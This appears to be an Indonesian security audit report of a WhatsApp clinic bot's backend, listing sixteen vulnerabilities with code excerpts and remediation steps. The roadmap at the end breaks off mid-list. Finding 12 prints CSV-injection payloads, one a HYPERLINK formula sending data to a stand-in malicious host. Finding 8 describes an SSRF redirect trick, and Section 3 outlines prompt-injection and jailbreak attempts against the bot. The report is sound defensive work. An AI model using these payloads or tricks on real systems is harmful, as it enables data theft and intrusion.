# LAPORAN AUDIT KEAMANAN SIBER HOLISTIK & MENDALAM
**Sistem:** WhatsApp Clinic Bot Engine (`wa-clinic-bot`)  
**Lingkup Audit:** Arsitektur Backend (Node.js/Fastify/Prisma), Integrasi WhatsApp (WAHA/WABA), Admin API & Dashboard, AI/LLM Pipeline & Tools, Integrasi Pihak Ketiga (Google OAuth, Meta CAPI, Telegram), Otentikasi & Otorisasi.  
**Tanggal Audit:** 25 September 2026  
**Auditor:** Senior Cybersecurity & Application Security Expert  
**Metodologi:** Static Application Security Testing (SAST), Manual Code Review, Threat Modeling, Architecture & Boundary Analysis berbasis framework OWASP Top 10 API Security, OWASP Top 10 LLM Applications, dan CWE.

---

## 1. RINGKASAN EKSEKUTIF & POSTUR KEAMANAN SISTEM

Sistem **WhatsApp Clinic Bot Engine** adalah aplikasi kritis yang melayani pendaftaran homecare kesehatan ibu & anak, interaksi pelanggan melalui WhatsApp (WAHA/Meta Cloud API), orkestrasi model AI (SumoPod/Kenari/DeepSeek), dan pengelolaan operasional klinik melalui Admin Dashboard.

Sistem telah memiliki beberapa pertahanan keamanan yang patut diapresiasi, antara lain:
- Adanya pemindai kebocoran kunci (`scripts/scan-secrets.ts`).
- Penggunaan `crypto.timingSafeEqual` untuk validasi token & signature webhook (`src/utils/auth.ts`, `src/integrations/whatsapp/signature.ts`).
- Implementasi *Tool Masking* deterministik dan *Commit Gate* untuk mencegah halusinasi transaksi LLM.
- Sanitasi HTML berlapis untuk custom landing page (`src/services/html-sanitizer.ts`).

Namun, dari hasil audit holistik mendalam lintas seluruh lapisan kode sumber (`src/`, `prisma/`, `packages/admin-dashboard/`, dan file konfigurasi), ditemukan **sejumlah kerentanan keamanan signifikan**, mulai dari level **CRITICAL**, **HIGH**, hingga **MEDIUM**. Kerentanan ini berpotensi menyebabkan **kebocoran data medis pasien (PII), pengambilalihan akun staf/terapis (BOLA/IDOR), eksekusi kueri SQL sewenang-wenang, Server-Side Request Forgery (SSRF) via HTTP Redirect, pembajakan webhook Telegram, hingga pengabaian batasan peran (RBAC) pada backend API**.

### Matriks Distribusi Kerentanan

| Tingkat Keparahan (Severity) | Jumlah Temuan | Area Terdampak Utama |
| :--- | :---: | :--- |
| 🔴 **CRITICAL** | 2 | Webhook Otentikasi (Telegram), Penyimpanan Sesi Admin Plaintext |
| 🟠 **HIGH** | 5 | Otorisasi RBAC Backend, BOLA/IDOR Pairing Staf, Path Traversal Avatar, Arbitrary SQL Restore, Isolasi Multi-Tenant |
| 🟡 **MEDIUM** | 6 | SSRF Filter Bypass (Redirect), CSRF & OAuth State Integrity, Plaintext Token DB, Rate Limiting Over-Exemption, Formula Injection CSV, Origin Bypass Tracking |
| 🔵 **LOW / INFO** | 4 | Information Leakage (Healthcheck & `/state`), IP Spoofing via Cookie, Reverse Proxy Trust, Hard Delete Command WhatsApp |

---

## 2. DETAIL TEMUAN KERENTANAN & ANALISIS RISIKO

---

### [TEMUAN 01 - CRITICAL] Bypass Otentikasi Penuh pada Webhook Telegram
- **Kategori:** OWASP API2:2023 - Broken Authentication / CWE-287
- **Lokasi File:** `src/routes/telegram-webhook.route.ts:28-35` dan `src/app.ts:36-56`
- **Mekanisme Kerentanan:**
  Pada handler webhook Telegram, pemeriksaan token rahasia dibungkus dalam blok kondisional:
  ```typescript
  // src/routes/telegram-webhook.route.ts
  const secretTokenHeader = (request.headers['x-telegram-bot-api-secret-token'] || '') as string;
  const expectedSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
  if (expectedSecret) {
    if (!secretTokenHeader || !safeCompare(secretTokenHeader, expectedSecret)) {
      return reply.status(403).send({ error: 'Unauthorized: Invalid Telegram secret token' });
    }
  }
  ```
  Di `src/app.ts`, server memvalidasi `ADMIN_API_KEY`, `WAHA_WEBHOOK_SECRET`, dan `WABA_APP_SECRET` saat startup, tetapi **TIDAK memeriksa atau mewajibkan `TELEGRAM_WEBHOOK_SECRET`**.
  Jika `TELEGRAM_WEBHOOK_SECRET` tidak didefinisikan (kosong/undefined) di file `.env`, kondisi `if (expectedSecret)` bernilai `false`, sehingga **seluruh verifikasi keamanan dilewati**.
- **Dampak Keamanan:**
  Penyerang dari internet publik dapat mengirimkan payload HTTP POST palsu ke `/api/webhook/telegram` tanpa secret token. Penyerang dapat:
  1. Menghubungkan akun Telegram penyerang ke akun staf/terapis (`/start [PAIRING_TOKEN]`).
  2. Menghubungkan grup Telegram penyerang ke sistem notifikasi laporan operasional klinik (`/start [GROUP_TOKEN]`).
  3. Memanipulasi state sistem dan memicu eksekusi command Telegram.
- **Rekomendasi Remediasi:**
  Terapkan prinsip *Fail-Closed*:
  1. Di `src/app.ts`, wajibkan konfigurasi `TELEGRAM_WEBHOOK_SECRET` di lingkungan produksi.
  2. Di `telegramWebhookRoutes`, tolak seluruh request jika `expectedSecret` kosong atau jika header `x-telegram-bot-api-secret-token` tidak cocok (tanpa `if (expectedSecret)` opsional).

---

### [TEMUAN 02 - CRITICAL] Penyimpanan Token Sesi Super Admin secara Plaintext di Filesystem
- **Kategori:** OWASP A02:2021 - Cryptographic Failures / CWE-312
- **Lokasi File:** `src/services/admin-session.service.ts:14-55`
- **Mekanisme Kerentanan:**
  Sistem memiliki dua implementasi sesi:
  - `StaffAuthService` (Bagus): Menggunakan hash SHA-256 (`token_hash`) sebelum menyimpan token ke database PostgreSQL (`staff_sessions`).
  - `AdminSessionService` (Rentan): Menyimpan raw token random 32-byte langsung dalam format JSON plaintext di file lokal:
    ```typescript
    // src/services/admin-session.service.ts:15
    const STORAGE_FILE = path.join(process.cwd(), 'storage', 'admin_sessions.json');
    ...
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(list), 'utf-8');
    ```
  Token sesi Super Admin memiliki masa berlaku (TTL) sangat panjang, yaitu **30 Hari** (`30 * 24 * 60 * 60 * 1000 ms`).
- **Dampak Keamanan:**
  Jika penyerang berhasil membaca file sistem (misalnya melalui path traversal, backup file leak, atau akses read-only container), penyerang memperoleh token sesi Super Admin aktif yang valid selama 30 hari tanpa perlu mengetahui kata sandi atau `ADMIN_API_KEY`.
- **Rekomendasi Remediasi:**
  1. Ubah arsitektur penyimpanan sesi Admin agar identik dengan staf: simpan hanya hash kriptografis (`sha256(token)`) di tabel database atau Redis.
  2. Hapus persistensi plaintext ke `storage/admin_sessions.json`.
  3. Kurangi TTL sesi admin atau terapkan mekanisme refresh token jangka pendek dengan invalidasi saat idle.

---

### [TEMUAN 03 - HIGH] Broken Object Level Authorization (BOLA/IDOR) pada Pengambilan Token Pairing Staf
- **Kategori:** OWASP API1:2023 - Broken Object Level Authorization / CWE-639
- **Lokasi File:** `src/routes/admin/staff-management.subroute.ts:341-364` dan `src/routes/admin.route.ts:173-184`
- **Mekanisme Kerentanan:**
  Endpoint `GET /api/admin/staff/:id/telegram-pairing` mengembalikan token pairing Telegram rahasia untuk staf dengan ID `:id`.
  Di `admin.route.ts:174`, guard RBAC staf hanya memblokir method non-GET:
  ```typescript
  if (urlPath.startsWith('/api/admin/staff') && request.method !== 'GET') { ... }
  ```
  Karena endpoint ini menggunakan method `GET`, guard mengizinkan seluruh staf yang login (termasuk peran Terapis berhak akses rendah) untuk mengaksesnya. Tidak ada validasi kepemilikan objek (`staffSession.staff.id === id`).
- **Dampak Keamanan:**
  Setiap staf atau terapis yang memiliki akses login dapat meminta token pairing Telegram milik staf/bidan lain (atau bahkan manajer/supervisor). Penyerang kemudian memasukkan token tersebut ke bot Telegram (`/start <token>`) untuk menyadap notifikasi tugas, rincian pasien, nama ibu & bayi, alamat rumah, patokan navigasi, dan tarif medis pasien yang ditugaskan kepada staf korban.
- **Rekomendasi Remediasi:**
  1. Batasi `GET /api/admin/staff/:id/telegram-pairing` agar hanya dapat diakses oleh `SUPER_ADMIN`, atau pastikan staf hanya dapat melihat token pairing miliknya sendiri (`req.staffId === req.params.id`).

---

### [TEMUAN 04 - HIGH] Ketiadaan Penegakan Otorisasi (RBAC) pada Custom Roles di Lapisan Backend
- **Kategori:** OWASP API5:2023 - Broken Function Level Authorization / CWE-285
- **Lokasi File:** `src/routes/admin/roles.subroute.ts:58-100` dan `src/routes/admin.route.ts:135-185`
- **Mekanisme Kerentanan:**
  Sistem menyediakan fitur pembuatan Custom Role dengan konfigurasi `allowedPaths` (misal: peran `therapist` hanya diizinkan membuka path `/staff/today`).
  Namun, setelah diaudit di seluruh codebase backend (`src/`), **properti `allowed_paths` TIDAK PERNAH diperiksa atau ditegakkan oleh Fastify hooks di backend**.
  Pemeriksaan peran di backend (`src/routes/admin.route.ts`) hanya memeriksa daftar statis `superAdminOnlyPrefixes`:
  ```typescript
  const superAdminOnlyPrefixes = [
    '/api/admin/backup',
    '/api/admin/settings',
    '/api/admin/ai-models',
    '/api/admin/evaluations',
    ...
  ];
  ```
  Endpoint-endpoint penting berikut **TIDAK ADA** dalam `superAdminOnlyPrefixes`:
  - `/api/admin/reservations/*` (Membaca, membuat, mengubah, membatalkan reservasi)
  - `/api/admin/customers/*` (Mengekspor & mengubah seluruh data pribadi pelanggan)
  - `/api/admin/live-chat/*` (Membaca percakapan WhatsApp live, membajak chat, mengirim balasan palsu)
  - `/api/admin/knowledge/*` (Mengubah basis pengetahuan klinis & FAQ bot)
  - `/api/admin/landings/*` (Mengubah konten landing page)
  - `/api/admin/financial-analytics/*` (Melihat omset, pendapatan, data finansial)
- **Dampak Keamanan:**
  Pembatasan hak akses custom role hanya bersifat **kosmetik visual di dashboard React**. Pengguna dengan akun Terapis dapat langsung menembakkan request API menggunakan cURL/Postman untuk membaca dan memanipulasi seluruh reservasi, data pelanggan, live chat, dan laporan keuangan klinik.
- **Rekomendasi Remediasi:**
  Buat middleware otorisasi deterministik di backend yang membaca `allowed_paths` peran pengguna dari database/cache dan mencocokkannya dengan rute API Fastify yang sedang diakses.

---

### [TEMUAN 05 - HIGH] Path Traversal & Arbitrary File Read pada Rute Avatar Publik
- **Kategori:** OWASP A01:2021 - Broken Access Control / CWE-22 (Path Traversal)
- **Lokasi File:** `src/routes/media.route.ts:178-203`
- **Mekanisme Kerentanan:**
  Pada handler endpoint publik `GET /media/avatar/:customerId`:
  ```typescript
  const rawId = request.params.customerId.replace(/\.(jpg|jpeg|png|webp|svg)$/i, '');
  const avatarDir = path.join(process.cwd(), 'storage', 'media', 'avatars');
  const localAvatarPath = path.join(avatarDir, `${rawId}.jpg`);

  if (fs.existsSync(localAvatarPath) && fs.statSync(localAvatarPath).isFile()) {
    reply.header('Access-Control-Allow-Origin', '*');
    reply.type('image/jpeg');
    return reply.send(fs.createReadStream(localAvatarPath));
  }
  ```
  Variabel `rawId` dibentuk dari parameter URL tanpa validasi sanitasi nama file (`path.basename`) atau pemeriksaan batasan direktori (`localAvatarPath.startsWith(avatarDir)`).
  Jika penyerang mengirimkan path traversal (misal: `%2e%2e%2f%2e%2e%2f` atau karakter separator Windows), `path.join` akan meresolusi path keluar dari direktori `avatars`.
  Selain itu, pada baris 218-219:
  ```typescript
  if (!fs.existsSync(avatarDir)) fs.mkdirSync(avatarDir, { recursive: true });
  fs.writeFileSync(localAvatarPath, Buffer.from(picRes.data));
  ```
  Jika customer memiliki `profile_picture_url`, server akan mendownload konten tersebut dan menulisnya ke `localAvatarPath` (potensi *Arbitrary File Write* jika path ter-traversal).
- **Dampak Keamanan:**
  Penyerang tanpa otentikasi dapat membaca file berakhiran `.jpg` di luar direktori media yang semestinya, atau menimpa file di sistem jika flow penulisan avatar terpicu.
- **Rekomendasi Remediasi:**
  1. Sanitasi `customerId` secara ketat menggunakan regex ID kanonis (misal: UUID / CUID `/^[a-zA-Z0-9_-]+$/`).
  2. Terapkan validasi `path.resolve(localAvatarPath).startsWith(path.resolve(avatarDir))`.

---

### [TEMUAN 06 - HIGH] Eksekusi Kueri SQL Sewenang-wenang melalui Fitur Restore Database
- **Kategori:** OWASP A03:2021 - Injection / CWE-89
- **Lokasi File:** `src/routes/admin/backup.subroute.ts:158-247` dan `src/services/backup.service.ts:555-563`
- **Mekanisme Kerentanan:**
  Endpoint `POST /api/admin/backup/upload-file` mengizinkan upload file backup dengan ekstensi `.sql` atau `.sql.gz`. File ini kemudian dapat direstore melalui `POST /api/admin/backup/restore`.
  Pada `BackupService.restoreDatabaseFromDump`:
  ```typescript
  // src/services/backup.service.ts:555
  // Jika berupa SQL Dump mentah, jalankan eksekusi query
  try {
    await prisma.$executeRawUnsafe(decompressed);
    tablesRestored = 1;
  } catch (err: any) { ... }
  ```
  Fungsi ini memanggil `prisma.$executeRawUnsafe(decompressed)` secara langsung pada isi file yang di-upload tanpa validasi AST, parser whitelist, atau transaksi terisolasi.
- **Dampak Keamanan:**
  Jika akun admin disusupi, atau jika penyerang berhasil memanfaatkan kerentanan CSRF / token theft, penyerang dapat mengunggah file SQL berisi kueri destruktif (seperti `DROP DATABASE`, pencurian kredensial, modifikasi data audit log, atau pembuatan user baru).
- **Rekomendasi Remediasi:**
  1. Batasi restore hanya untuk format terstruktur yang divalidasi skemanya (seperti format JSON internal yang diproses entitas per entitas via Prisma ORM model).
  2. Nonaktifkan eksekusi SQL mentah (`$executeRawUnsafe`) dari file upload pihak ketiga.

---

### [TEMUAN 07 - HIGH] Kerusakan Isolasi Multi-Tenant (Tenant Data Leakage) Akibat Hardcode Tenant
- **Kategori:** Multi-Tenancy Security / OWASP A01:2021 - Broken Access Control
- **Lokasi File:** 
  - `src/routes/admin/livechat.subroute.ts:398`
  - `src/routes/admin/reservations.subroute.ts:70,81`
  - `src/routes/admin/staff-management.subroute.ts:16,98`
- **Mekanisme Kerentanan:**
  Meskipun arsitektur bot dirancang untuk mendukung *Multi-Tenant SaaS*, sejumlah besar endpoint backend mengabaikan tenant ID sesi staf dan melakukan hardcode ke `DEFAULT_TENANT_ID`:
  ```typescript
  // src/routes/admin/livechat.subroute.ts:398
  tenantId: DEFAULT_TENANT_ID, // Saat admin membalas pesan

  // src/routes/admin/reservations.subroute.ts:81
  const count = await prisma.reservation.count({ where: { tenant_id: DEFAULT_TENANT_ID } });

  // src/routes/admin/staff-management.subroute.ts:16
  const staffList = await prisma.staff.findMany({ where: { tenant_id: DEFAULT_TENANT_ID } });
  ```
- **Dampak Keamanan:**
  Jika sistem digunakan oleh lebih dari satu klinik/tenant, staf dari Tenant B akan melihat dan memanipulasi data milik `default-tenant` (Tenant A). Ini melanggar kepatuhan privasi data medis antar entitas klinik.
- **Rekomendasi Remediasi:**
  Ambil `tenant_id` secara konsisten dari token sesi terotentikasi pengguna (`req.staffTenantId` atau `req.tenantId`), bukan mengandalkan fallback konstanta `DEFAULT_TENANT_ID`.

---

### [TEMUAN 08 - MEDIUM] Bypass Filter SSRF melalui Mekanisme HTTP 302 Redirect pada Avatar Proxy
- **Kategori:** OWASP A10:2021 - Server-Side Request Forgery (SSRF) / CWE-918
- **Lokasi File:** `src/routes/media.route.ts:55-79` dan `src/routes/media.route.ts:206-215`
- **Mekanisme Kerentanan:**
  Fungsi `isValidExternalUrl` melakukan pengecekan hostname berbasis blocklist string:
  ```typescript
  // src/routes/media.route.ts:59
  if (
    hostname === 'localhost' ||
    hostname === '127.0.0.1' ||
    hostname.endsWith('.internal') ||
    /^10\./.test(hostname) ||
    /^192\.168\./.test(hostname)
  ) return false;
  ```
  Kelemahan filter ini:
  1. **HTTP Redirect**: Library `axios` secara default akan mengikuti redirect HTTP (301/302). Jika penyerang memasukkan URL `https://attacker-domain.com/avatar.jpg` (yang lolos verifikasi `isValidExternalUrl`), lalu server penyerang mengembalikan respons `302 Found` dengan header `Location: http://127.0.0.1:3000/api/admin/...` atau `http://waha:3000/api/sessions`, Axios **akan mengikuti redirect tersebut ke jaringan internal**.
  2. **Notasi IP Alternatif**: Filter tidak memblokir representasi IP desimal (mis. `2130706433`), heksadesimal (`0x7f000001`), octal (`0177.0.0.1`), atau varian loopback `127.0.0.2` s/d `127.255.255.254`.
  3. **Metadata Cloud**: Penyedia cloud seperti Alibaba (`100.100.100.200`) dan Oracle Cloud (`192.0.0.192`) tidak masuk dalam daftar blokir.
- **Dampak Keamanan:**
  Server dapat dipaksa melakukan request ke layanan internal (PostgreSQL, Redis, WAHA HTTP API, atau layanan metadata cloud host) dan membocorkan data responnya.
- **Rekomendasi Remediasi:**
  1. Konfigurasikan Axios dengan opsi `maxRedirects: 0` pada pengambilan resource eksternal.
  2. Lakukan resolusi DNS terlebih dahulu menggunakan `dns.lookup()`, lalu validasi alamat IP hasil resolusi terhadap rentang IP privat (RFC 1918, RFC 3927, loopback RFC 1122).

---

### [TEMUAN 09 - MEDIUM] Potensi Serangan CSRF pada Seluruh Admin API State-Changing
- **Kategori:** OWASP A01:2021 - Broken Access Control / CWE-352 (CSRF)
- **Lokasi File:** `src/routes/admin.route.ts:95-130` dan `src/app.ts:80-145`
- **Mekanisme Kerentanan:**
  Sistem Fastify menggunakan cookie `admin_session` dan `staff_session` dengan atribut `SameSite=Lax`.
  Meskipun `SameSite=Lax` memberikan perlindungan dasar terhadap request lintas domain standar, sistem **tidak memiliki perlindungan CSRF token sama sekali** (tidak ada `@fastify/csrf-protection`).
  Dalam skenario subdomain takeover, kerentanan XSS pada landing page, atau integrasi pihak ketiga, request state-changing (`POST`, `PUT`, `DELETE`, `PATCH`) dapat dipicu tanpa verifikasi token anti-pemalsuan.
- **Dampak Keamanan:**
  Tindakan administratif dapat dieksekusi atas nama admin yang sedang login tanpa sepengetahuannya.
- **Rekomendasi Remediasi:**
  Terapkan proteksi CSRF berbasis header ganda (*Double Submit Cookie*) atau custom request header wajib (seperti `X-Requested-With` atau token CSRF khusus) pada seluruh rute API admin non-idempotent.

---

### [TEMUAN 10 - MEDIUM] Ketiadaan Verifikasi Integritas State pada Google OAuth Flow
- **Kategori:** OWASP A07:2021 - Identification & Authentication Failures / CWE-352
- **Lokasi File:** `src/integrations/google-contacts/google-oauth.client.ts:58-84` dan `src/routes/admin/google-integration.subroute.ts:36-78`
- **Mekanisme Kerentanan:**
  Pada implementasi Google OAuth:
  ```typescript
  // src/integrations/google-contacts/google-oauth.client.ts:58
  const statePayload = Buffer.from(
    JSON.stringify({ tenantId, timestamp: Date.now() })
  ).toString('base64');
  ```
  Parameter `state` hanya berupa payload JSON base64 tanpa *HMAC signature*, tanpa *random cryptographic nonce*, dan tanpa verifikasi sesi penginisiasi.
  Ketika callback diterima di `/api/admin/integrations/google/callback`, handler hanya mem-parse base64 tersebut tanpa memvalidasi apakah state tersebut berasal dari sesi yang sama.
  Selain itu, di `admin.route.ts:152`, daftar proteksi peran adalah `'/api/admin/google'`, padahal rute callback yang terdaftar adalah `'/api/admin/integrations/google/callback'` (prefix mismatch).
- **Dampak Keamanan:**
  Penyerang dapat menjebak admin untuk mengklik URL callback yang sudah disiapkan penyerang (OAuth Login CSRF), menghubungkan akun Google milik penyerang ke klinik korban, atau mengarahkan sinkronisasi kontak/kalender pasien ke akun luar.
- **Rekomendasi Remediasi:**
  Sertakan nonce acak yang ditandatangani HMAC (`crypto.createHmac`) atau simpan nonce di cookie/sesi pengguna saat meng-generate URL OAuth, dan validasi kecocokannya saat menerima callback.

---

### [TEMUAN 11 - MEDIUM] Kredensial Sensitif (OAuth Refresh Token & Telegram Token) Disimpan Plaintext di Database
- **Kategori:** OWASP A02:2021 - Cryptographic Failures / CWE-312
- **Lokasi File:** 
  - `prisma/schema.prisma:441-442` (`refresh_token`, `access_token` pada `TenantGoogleIntegration`)
  - `prisma/schema.prisma:643` (`telegram_bot_token` pada `Tenant`)
  - `src/routes/admin/settings.subroute.ts:1827,1945`
- **Mekanisme Kerentanan:**
  Modul enkripsi kuat AES-256-GCM telah tersedia di `src/utils/encryption.ts` (`encryptSecret` / `decryptSecret`). Namun modul ini hanya digunakan untuk Meta CAPI token.
  Sementara itu, Google OAuth `refresh_token` (yang memberikan akses permanen ke Google Contacts & Google Drive), `access_token`, dan `telegram_bot_token` disimpan dalam bentuk **plaintext mentah** di tabel database PostgreSQL.
  Bahkan pada endpoint `GET /api/admin/settings/telegram`, `telegram_bot_token` dikembalikan secara utuh dalam respons JSON API.
- **Dampak Keamanan:**
  Jika database PostgreSQL terekspos (via SQL injection, database dump, atau backup file), seluruh token Google dan token bot Telegram dapat diambil oleh penyerang.
- **Rekomendasi Remediasi:**
  Gunakan fungsi `encryptSecret` sebelum menyimpan token ke database, dan gunakan `decryptSecret` saat runtime. Sensor nilai token pada respons API admin dashboard (hanya tampilkan status terkonfigurasi: `true`/`false`).

---

### [TEMUAN 12 - MEDIUM] Formula Injection (CSV Injection) pada Rekap Finansial Bulanan
- **Kategori:** CWE-1236: Improper Neutralization of Formula Elements in a CSV File
- **Lokasi File:** `src/services/financial-analytics.service.ts:448-482`
- **Mekanisme Kerentanan:**
  Pada ekspor file CSV transaksi:
  ```typescript
  const escapeCsv = (val: any) => {
    const s = String(val ?? '').replace(/"/g, '""');
    return `"${s}"`;
  };
  ```
  Fungsi hanya melakukan *escape* tanda petik dua (`"`). Jika pelanggan WhatsApp mendaftarkan nama, alamat, atau keluhan yang diawali dengan karakter formula spreadsheet (`=`, `+`, `-`, `@`, `\t`, `\r`), misalnya:
  `=cmd|'/C calc'!A0` atau `=HYPERLINK("http://malicious-site.com/steal?data=" & A1)`
  Maka saat staf keuangan atau akuntan klinik membuka file CSV tersebut di Microsoft Excel atau Google Sheets, formula tersebut akan dieksekusi secara otomatis oleh aplikasi spreadsheet.
- **Dampak Keamanan:**
  Potensi eksekusi perintah lokal (*Arbitrary Command Execution*) pada komputer staf/manajer klinik yang membuka rekapitulasi laporan transaksi.
- **Rekomendasi Remediasi:**
  Sebelum membungkus nilai dengan tanda kutip, jika karakter pertama string adalah `=`, `+`, `-`, `@`, `\t`, atau `\r`, tambahkan prefix tanda petik tunggal (`'`) untuk memaksa spreadsheet memperlakukannya sebagai teks murni.

---

### [TEMUAN 13 - MEDIUM] Pengecualian Berlebihan (Over-Exemption) pada Global Rate Limiter
- **Kategori:** OWASP API4:2023 - Unrestricted Resource Consumption / CWE-770
- **Lokasi File:** `src/app.ts:87-126`
- **Mekanisme Kerentanan:**
  Konfigurasi `@fastify/rate-limit` di `src/app.ts` memiliki fungsi `allowList` yang sangat longgar:
  ```typescript
  allowList: (request) => {
    const url = request.url || '';
    if (url.startsWith('/webhook') || url.startsWith('/api/webhook')) return true; // Webhooks dikecualikan
    if (url.includes('/events') || url.includes('/stream')) return true;          // SSE dikecualikan
    if (url.startsWith('/admin') || url.startsWith('/assets') || url.startsWith('/landing')) return true; // Static dikecualikan
    if (url.startsWith('/api/admin')) return true;                                // SELURUH API Admin dikecualikan
    return false;
  }
  ```
  Hampir 90% endpoint aplikasi dikecualikan dari rate limiting global.
- **Dampak Keamanan:**
  1. Penyerang dapat melakukan flooding request ke `/webhook` atau `/api/webhook/waba` untuk menghabiskan CPU dan memory (*Denial of Service*).
  2. Endpoint `/api/admin/*` tidak memiliki batas frekuensi global, memudahkan serangan brute force atau pemborosan resource database.
- **Rekomendasi Remediasi:**
  Terapkan rate limiting spesifik per kategori rute dengan batas kuota wajar daripada membebaskannya secara total (`return true`).

---

### [TEMUAN 14 - LOW] Perintah `/state` Membocorkan Info Internal & Command `/reset` Menghapus Data
- **Kategori:** OWASP A01:2021 - Security Misconfiguration / Information Disclosure
- **Lokasi File:** `src/services/command.service.ts:80-96` dan `src/services/command.service.ts:205-215`
- **Mekanisme Kerentanan:**
  - Jika pelanggan mengetik `/state`, bot membalas dengan struktur state machine internal: `current_state`, `previous_state`, `location_attempts`, `is_human_handling`, dan status coverage.
  - Jika pelanggan mengetik `/reset` dan membalas `YA`, server melakukan *Hard Delete* (`prisma.customer.delete`) yang melalui relasi *cascade* menghapus seluruh data anak, riwayat percakapan, dan reservasi pasien secara permanen.
- **Dampak Keamanan:**
  Membocorkan konfigurasi internal mesin ke publik WhatsApp dan potensi penghapusan data penting jika chat nomor pelanggan digunakan oleh pihak yang tidak bertanggung jawab.
- **Rekomendasi Remediasi:**
  1. Batasi command `/state` hanya untuk nomor telepon admin atau hanya aktif saat `NODE_ENV !== 'production'`.
  2. Untuk `/reset`, lakukan *Soft Delete* (arsip/inaktif) daripada `DELETE` fisik permanen dari database.

---

### [TEMUAN 15 - LOW] Parameter Tracking Origin Bypass & Manipulasi IP via Cookie
- **Kategori:** CWE-290: Authentication Bypass by Spoofing
- **Lokasi File:** `src/routes/tracking.route.ts:186-192` dan `src/routes/tracking.route.ts:208-211`
- **Mekanisme Kerentanan:**
  Pada endpoint `POST /api/tracking/click`:
  ```typescript
  // src/routes/tracking.route.ts:188
  const isBrowserLanding = origin.includes('/promo/') || origin.includes('/go') || origin.includes('/cta') || origin.startsWith('http');
  ```
  Kondisi `origin.startsWith('http')` bernilai `true` untuk **seluruh request web HTTP/HTTPS dari domain manapun** (misal: `http://evil.com`), sehingga validasi `TRACKING_API_KEY` sepenuhnya dilewati.
  Selain itu, baris 208-211 mengizinkan header cookie `_fbi` menimpa `request.ip`, memungkinkan spoofing IP klik iklan secara bebas oleh klien.
- **Dampak Keamanan:**
  Penyerang dapat mengotori data konversi iklan Meta Ads dan merusak algoritma optimasi kampanye iklan klinik.
- **Rekomendasi Remediasi:**
  Cocokkan header `Origin` atau `Referer` terhadap whitelist domain landing page resmi tenant klinik, dan prioritaskan `request.ip` asli jaringan daripada cookie klien.

---

### [TEMUAN 16 - LOW] Kebocoran Informasi Error Database pada Endpoint `/ready`
- **Kategori:** OWASP A05:2021 - Security Misconfiguration / CWE-209
- **Lokasi File:** `src/routes/health.route.ts:33`
- **Mekanisme Kerentanan:**
  Pada endpoint publik `GET /ready`:
  ```typescript
  checks.database = `FAILED: ${err.message}`;
  ```
  Jika koneksi database terputus atau gagal, pesan error Prisma/PostgreSQL mentah dikembalikan ke publik. Pesan error database seringkali memuat informasi port, host internal, atau detail konfigurasi database.
- **Dampak Keamanan:**
  Membantu penyerang dalam melakukan pemetaan arsitektur jaringan internal (*Reconnaissance*).
- **Rekomendasi Remediasi:**
  Kembalikan pesan generik (`FAILED: Database unavailable`) ke klien publik dan log detail `err.message` secara privat di server.

---

## 3. ANALISIS KEAMANAN PADA LAPISAN AI & LLM PIPELINE

Sistem memanfaatkan LLM (Large Language Model) untuk memproses teks keluhan ibu & bayi dan mengeksekusi routing tool:

1. **Prompt Injection & Persona Jailbreak**:
   - Pelanggan WhatsApp mengirimkan input langsung ke LLM context window. Ada potensi serangan *Direct Prompt Injection* di mana penyerang berusaha membuat bot memberikan klaim medis berbahaya (misal: diagnosa resep obat keras atau penanganan darurat tanpa ke RS).
   - **Status Pertahanan Saat Ini**: Sistem sudah memiliki layer `medical-signal-detector.ts` dan layer prompt `global-safety.layer.ts` serta batasan `negative_constraints`. Namun, model LLM probabilistik tetap memiliki celah jika penyerang menyamarkan instruksi dalam bahasa daerah atau dialek campuran.
2. **Integritas Tool Execution (Tool Hijacking)**:
   - Tool kritis seperti `save_reservation` telah diproteksi dengan sangat baik menggunakan **Dynamic Tool Masking** (`tool-masker.ts`) dan **Booking Commit Gate** (`booking-commit-gate.ts`), sehingga tool tidak dapat dipanggil jika belum ada kesepakatan jadwal eksplisit dari pelanggan. Ini adalah contoh pertahanan deterministik yang sangat solid.

---

## 4. ROADMAP & REKOMENDASI PERBAIKAN BERTAHAP (ACTION PLAN)

Sesuai dengan **Mandat Solusi Fondasional** dan **Larangan Solusi Kosmetik**, perbaikan sistemik wajib dilakukan bertahap berdasarkan prioritas:

### Fase 1: Perbaikan Kritis Otentikasi & Ingress (Segera / P0)
1. **Hardening Webhook Telegram (`telegram-webhook.route.ts`)**:
   - Hapus kondisional opsional; wajibkan header `x-telegram-bot-api-secret-token` cocok dengan secret yang terkonfigurasi.
   - Tambahkan pengecekan `TELEGRAM_WEBHOOK_SECRET` di `src/app.ts` saat boot server.
2. **Hashing Sesi Admin (`admin-session.service.ts`)**:
   - Migrasikan sesi admin agar disimpan dalam bentuk hash SHA-256 di tabel database atau Redis.
   - Hapus mekanisme penyimpanan file plaintext `storage/admin_sessions.json`.
3. **Patch Path Traversal Avatar (`media.route.ts`)**:
   - Sanitasi parameter `:customerId` dengan whitelist alfanumerik `^[a-zA-Z0-9_-]+$`.
   - Pastikan path file yang dibuka selalu berada di dalam `storage/media/avatars/`.

### Fase 2: Otorisasi & Pencegahan Eskalasi Hak Akses (P1)
1. **Penegakan RBAC Custom Role di Level Backend (`admin.route.ts`)**:
   - Implementasikan verifikasi `allowed_paths` dari database/cache ke dalam hook `preHandler` Fastify.
   - Pastikan peran `THERAPIST` atau peran terbatas lainnya otomatis diblokir saat mencoba mengakses endpoint yang tidak ada di daftar hak aksesnya.
2. **Perbaikan BOLA/IDOR Pairing Staf (`staff-management.subroute.ts`)**:
   - Batasi akses `GET /api/admin/staff/:id/telegram-pairing` hanya untuk Super Admin atau pemilik akun yang bersangkutan.
3. **Eliminasi Hardcoded Tenant ID**:
   - Ganti referensi `DEFAULT_TENANT_ID` di rute livechat, reservasi, dan staf dengan `tenantId` yang diekstrak dari sesi klien.

### Fase 3: Hardening Enkripsi, Data Sanitization & SSRF (P2)
1. **Enkripsi Kredensial Pihak Ketiga di Database**:
   - Terapkan fungsi `encryptSecret` pada `refresh_token`, `access_token` Google, dan `telegram_bot_token` sebelum disimpan ke PostgreSQL.
   - Maskir token bot Telegram pada respons API admin.
2. **Mitigasi SSRF pada Avatar Downloader (`media.route.ts`)**:
   - Set `maxRedirects: 0` pada Axios request untuk mencegah pengalihan 302 ke IP internal/loopback.
3. **Sanitasi Formula CSV (`financial-analytics.service.ts`)**:
   - Tambahkan karakter `'` di awal sel string yang diawali `=`, `+`, `-`, atau `@`.
4. **Perbaikan OAuth CSRF State**:
